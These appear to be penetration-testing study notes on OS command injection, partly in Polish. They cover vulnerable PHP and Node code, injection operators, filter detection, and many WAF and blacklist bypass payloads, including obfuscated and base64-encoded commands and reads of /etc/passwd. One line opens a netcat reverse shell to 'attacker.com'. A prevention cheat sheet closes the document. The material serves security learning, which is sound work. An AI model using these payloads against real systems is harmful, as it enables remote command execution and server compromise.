**Risks:**  
- Remote Command Execution (RCE)  
- Complete server/network compromise  
- Privilege escalation  
- Data exfiltration  

 **Injection Type**                    | **Description**                                                                 |
|--------------------------------------|---------------------------------------------------------------------------------|
| OS Command Injection                 | Occurs when user input is directly used as part of an operating system command.|
| Code Injection                       | Occurs when user input is evaluated as code by the application.                |
| SQL Injection                        | Occurs when user input is directly used as part of an SQL query.              |
| Cross-Site Scripting / HTML Injection| Occurs when user input is rendered as HTML/JS in a web page without sanitization. |
| LDAP Injection                       | Occurs when unsanitized input is used in an LDAP query, potentially altering directory lookups. |
| NoSQL Injection                      | Occurs when user input is injected into NoSQL queries (e.g., MongoDB), allowing manipulation of logic. |
| HTTP Header Injection                | Occurs when user input is used in HTTP headers (e.g., `Location`, `Set-Cookie`), leading to response splitting or poisoning. |
| XPath Injection                      | Occurs when input is inserted into an XPath query, altering logic used to retrieve XML data. |
| IMAP Injection                       | Occurs when user input manipulates IMAP commands, potentially accessing or altering mailboxes. |
| ORM Injection                        | Occurs when user input alters Object-Relational Mapping queries, bypassing ORM-level protections. |


## OS Command Injections
### PHP Example


### 🧠 Dangerous Functions (examples):
- **PHP:** `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`
- **Node.js:** `child_process.exec()`, `child_process.spawn()`
- **Python:** `os.system()`, `subprocess.*`
- **Java:** `Runtime.getRuntime().exec()`

---

## 🧪 Vulnerable Code Examples

### 🔹 PHP Example:
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Vulnerable if filename is not sanitized:
    filename=test; whoami

### NodeJS Example
```
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
});
```
Vulnerable input:
filename=test;id

### Exploitation Basics
```
test;id
test&&whoami
test||ls
test|nc attacker.com 4444 -e /bin/bash
```

### 🛡️ Mitigation Strategies
* Never trust user input.
* Use input validation/whitelisting.
* Escape input properly.
* Use secure APIs (avoid shell execution).
* Apply least privilege to the running environment.

-------------------
# Detection

### Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                      |
|--------------------|---------------------|------------------------|----------------------------------------|
| Semicolon          | `;`                 | `%3b`                  | Both                                   |
| New Line           | `\n`                | `%0a`                  | Both                                   |
| Background         | `&`                 | `%26`                  | Both (second output generally shown first) |
| Pipe               | `|`                 | `%7c`                  | Both (only second output is shown)     |
| AND                | `&&`                | `%26%26`               | Both (only if first succeeds)          |
| OR                 | `||`                | `%7c%7c`               | Second (only if first fails)           |
| Sub-Shell          | `` ` ` `            | `%60%60`               | Both (Linux-only)                      |
| Sub-Shell          | `$()`               | `%24%28%29`            | Both (Linux-only)                     |

We can use any of these operators to inject another command so both or either of the commands get executed. We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.
For basic command injection, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server

Tip 
```
In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (``) or with a sub-shell operator ($()).

The only exception may be the semi-colon ;, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.
```
---
# Injecting Commands

## Injecting Our Command
```
ping -c 1 127.0.0.1; whoami
```
However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end. 

## [!] Bypassing Front-End Validation

* The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application.
---
# [!] Other Injection Operators 


When performing **OS Command Injection**, different operators affect how additional commands are executed. 
Here's a practical comparison of `&&` and `||`:

### AND Operator (`&&`)
- Syntax: `ping -c 1 127.0.0.1 && whoami`
- **Behavior**: Executes the second command **only if** the first succeeds (exit code 0).
- Usage: Useful when app logic requires valid input for both commands to run.
- Output: Both commands' results are returned.

## OR Operator (`||`)
- Syntax: `ping -c 1 127.0.0.1 || whoami`
- **Behavior**: Executes the second command **only if** the first fails (non-zero exit code).
- Usage: Useful when the original command fails or when input is intentionally malformed.
- Output: Only the second command's result is returned (if the first fails).

### Example:
- `ping -c 1 || whoami` → Executes `whoami` because ping fails (no IP supplied).

These logical operators are powerful for chaining or conditionally executing payloads during exploitation.

---

## Common Injection Operators by Injection Type

| Injection Type                        | Common Operators                              |
|--------------------------------------|-----------------------------------------------|
| SQL Injection                        | `'` , `;` , `--` , `/* */`                     |
| Command Injection                    | `;` , `&&` , `||` , `&` , `|`                  |
| LDAP Injection                       | `*` , `()` , `&` , `|`                         |
| XPath Injection                      | `'` , `or` , `and` , `not` , `substring`       |
| OS Command Injection                 | `;` , `&` , `|`                                |
| Code Injection                       | `'` , `;` , `--` , `/* */` , `$()` , `${}`     |
| Directory/File Path Traversal       | `../` , `..\\` , `%00`                         |
| Object Injection                     | `;` , `&` , `|`                                |
| XQuery Injection                     | `'` , `;` , `--` , `/* */`                     |
| Shellcode Injection                  | `\x` , `\u` , `%u` , `%n`                      |
| Header Injection                     | `\n` , `\r\n` , `\t` , `%0d` , `%0a` , `%09`   |

> ⚠️ The effectiveness of these operators **depends on the target's context and environment** (e.g., language, OS, framework).

---

## Final Notes

- Operators like `&&`, `||`, and `|` behave differently based on shell logic.
- Always test your payloads locally before injecting.
- For **advanced command injection** methods (indirect or blind), see: _Whitebox Pentesting 101: Command Injection_.

---
---
# Identifying Filters

Web applications often attempt to **prevent command injection** by implementing:

- **Blacklists** – Deny input containing specific characters or commands.
- **WAFs (Web Application Firewalls)** – Detect and block common patterns across various injection types (e.g., SQLi, XSS).

Even if these filters are in place, poor implementation can leave the app **still vulnerable**.

## Filter / WAF Detection

When submitting payloads with common operators (`;`, `&&`, `||`), the app may return messages like: Invalid input

This suggests the presence of a **blacklist filter** or **WAF**.

### Key Indicators:
| Behavior                             | Possible Cause        |
|--------------------------------------|------------------------|
| Custom error message in response box | App-level blacklist    |
| Full-page error or IP shown          | WAF or reverse proxy   |


## Identifying Blacklisted Characters

### Approach:

* Start with known-good input: 127.0.0.1
* Add one suspicious character at a time.
* Observe when "Invalid input" appears.

### Example Test:

* 127.0.0.1 → ✅ OK
* 127.0.0.1; → ❌ Blocked → ; is blacklisted
* Repeat this process for other operators: &, |, &&, ||, $(), \n,  etc.

## What to Do Next?

    Once a blacklisted character is identified, try alternative encodings, different payload structures, or bypasses (e.g., $(whoami) instead of ; whoami).

    This helps probe filter weaknesses or logic flaws in the blacklist/WAF.

    🔍 Identifying filters is a critical step in real-world web pentesting. Knowing what is blocked lets you plan bypass strategies effectively.


# Bypassing Space Filters

tip
```
The new-line character is usually not blacklisted
```

## Using Tabs
* %0a%09
* %0a${IFS} - Using the ($IFS) Linux Environment Variable

## Using Brace Expansion
Bash Brace Expansion
{ls,-la}
* %0a{ls,-la}

# 🧨 Command Injection: Bypassing Space Filters Cheatsheet

## 🚫 Problem: Spacja zablokowana
- Spacja (` `) często jest blacklistowana, np. w polach typu IP.
- Przykład niedziałającego payloadu:  
  `127.0.0.1%0a whoami` → ❌ _Invalid input_

## ✅ Bypass Techniki

| Metoda             | Opis                                                                 | Przykład payloadu                   | Działa w OS        |
|--------------------|----------------------------------------------------------------------|-------------------------------------|--------------------|
| **Tab (`\t`)**     | Użyj tabulatora (`%09`) zamiast spacji                               | `127.0.0.1%0a%09whoami`             | Linux/Windows      |
| **${IFS}**         | Linux var: Internal Field Separator (spacja lub tab)                 | `127.0.0.1%0a${IFS}whoami`          | Linux              |
| **Brace Expansion**| Bash: rozwija `{cmd,arg}` do `cmd arg`                               | `127.0.0.1%0a{ls,-la}`              | Linux/Bash         |
| **New Line (`\n`)**| Często nie jest filtrowany, działa jako separator                    | `127.0.0.1%0awhoami`                | Linux/Windows      |

> 🔎 Tip: Testuj pojedynczo — najpierw operator, potem każdą kolejną część payloadu.

## 📚 Źródła
- PayloadsAllTheThings: `Command Injection` → *"Commands without spaces"*

---
---
# 🔓 Bypassing Blacklisted Characters (Slashes, Semicolons, etc.)

## 🐧 Linux

**Using Env Variables:**
- Extract a single character: `${VAR:start:length}`
- Get `/` from `$PATH`:
  ```bash
  echo ${PATH} / returns local env
  ${PATH:0:1}  # returns /
  ${HOME:0:1}  # returns /
  ```
- Get `;` from `$LS_COLORS`:
  ```bash
  echo #{LS_COLORS} # return rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;3
  ${LS_COLORS:10:1}  # returns ;
  ```

**Other useful vars:** `$PWD`, `$HOME`, `$SHELL`

**Tips:**
- `${IFS}` → space
- Use `printenv` to search for variables with useful chars

**Payload example:**
```bash
127.0.0.1${LS_COLORS:10:1}${IFS}cat${IFS}/etc/passwd
```

---

## 🪟 Windows CMD

**Substrings from env vars:**
- Syntax: `%VAR:~start,end%`
- Get `\` from `%HOMEPATH%`:
  ```cmd
  echo %HOMEPATH:~6,-11%  # returns \
  ```

---

## ⚡ PowerShell

**Index env vars as arrays:**
- Get `\`:
  ```powershell
  $env:HOMEPATH[0]
  ```
- List all env vars:
  ```powershell
  Get-ChildItem Env:
  ```

---

## 🔁 Character Shifting (Linux)

**Use `tr` to shift ASCII chars:**
- Example: `[` (ASCII 91) → `\` (ASCII 92)
  ```bash
  echo $(tr '!-}' '"-~'<<<[)  # returns \
  ```
- Find needed ASCII codes with:
  ```bash
  man ascii
  ```

---
---
# Bypassing Blacklisted Commands - Cheat Sheet

## Basic Concept
When a web app blacklists commands (e.g., whoami, cat), we can bypass it by obfuscating the command while keeping its functionality.

---

## Obfuscation Techniques

### 1. Quote Insertion (Linux & Windows)
- Use single (') or double (") quotes
- Must be even number of quotes
- Examples:
  w'h'o'am'i    → whoami
  w"h"o"am"i   → whoami

### 2. Backslash or $@ (Linux Only)
- Bash ignores these characters
- Examples:
  who$@ami     → whoami
  w\ho\am\i    → whoami

### 3. Caret ^ (Windows Only)
- Cmd.exe ignores carets
- Example:
  wh\^o\^am\^i    → whoami

---

## Bypass Strategy
1. Test if command is blocked (e.g., whoami fails)
2. Obfuscate using quotes/backslashes/carets
3. Combine with other bypasses (e.g., newlines %0A)

---

## Example Payloads
Linux:
127.0.0.1%0Aw'h'o'am'i

Windows:
127.0.0.1|wh\^o\^am\^i

---

## Key Notes
- Don't mix quote types
- Works in most shells (Bash, PowerShell, Cmd)
- If blocked, try alternatives like base64 or variables

# Advanced Command Obfuscation
In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.


## === CASE MANIPULATION ===
* Windows (case-insensitive): WhOaMi → works as whoami
* Linux (needs conversion): 
  $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") → converts to whoami
  $(a="WhOaMi";printf %s "${a,,}") → alternative method

## === REVERSED COMMANDS ===
* Linux: 
  echo 'whoami' | rev → imaohw
  $(rev<<<'imaohw') → executes whoami
* Windows:
  "whoami"[-1..-20] -join '' → imaohw
  iex "$('imaohw'[-1..-20] -join '')" → executes whoami
Tip
```
If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.
```
## === ENCODED COMMANDS ===
* Base64 (Linux):
  echo -n 'cat /etc/passwd' | base64 → Y2F0IC9ldGMvcGFzc3dk
  bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk) → executes command
* Base64 (Windows):
  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) → encodes
  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" → decodes/executes
Tip
```
Note that we are using <<< to avoid using a pipe |, which is a filtered character.
```
## === PRO TIPS ===
1. Replace filtered chars:
   %09 (TAB) → spaces
   <<< → pipes |
2. Alternative tools:
   openssl enc -base64 if base64 blocked
   xxd for hex encoding
3. WAF bypass combo:
   $(tr "[A-Z]" "[a-z]"<<<$(rev<<<$(base64 -d<<<WYo...)))
4. Always:
   - Test locally first
   - Avoid URL-decoded special chars
   - Prepare 2-3 obfuscation methods

## === EXAMPLES ===
* Linux complex bypass:
  $(a="WhO$(echo am)i";printf %s "${a,,}"|rev) → whoami
* *Windows complex bypass:
  iex "$(-join[char[]](0x77,0x68,0x6f,0x61,0x6d,0x69))" → whoami via hex


# Evasion Tools
## Linux (Bashfuscator)
* ./bashfuscator -h
* ./bashfuscator -c 'cat /etc/passwd'
* ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

## Windows (DOSfuscation)
https://github.com/danielbohannon/Invoke-DOSfuscation.git

Tip
```
If we do not have access to a Windows VM, we can run the above code on a Linux VM through pwsh. Run pwsh, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this link.
```

# COMMAND INJECTION PREVENTION CHEAT SHEET

[1] AVOID DANGEROUS FUNCTIONS
* Never use: system(), exec(), passthru(), shell_exec() (PHP) | child_process.exec() (Node)
* Alternatives: fsockopen() (PHP), built-in file operations

[2] INPUT VALIDATION (DO BOTH)
* Front-end + back-end validation
* PHP: filter_var($_GET['ip'], FILTER_VALIDATE_IP)
* Regex for IPs: ^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(...){3}$

[3] SANITIZATION
* PHP: preg_replace('/[^0-9.]/', '', $input)
* Node: DOMPurify.sanitize(input) or input.replace(/[^A-Za-z0-9.]/g, '')

[4] SERVER HARDENING
* disable_functions = exec,passthru,system,shell_exec
* open_basedir = /var/www/html
* Run as low-privilege user (www-data)
* Use WAF (mod_security)

[5] SECURE CODING PRACTICES
* Principle of Least Privilege
* Reject double-encoded requests
* Keep software updated
* Regular pentesting

[!] GOLDEN RULE: Never trust user input!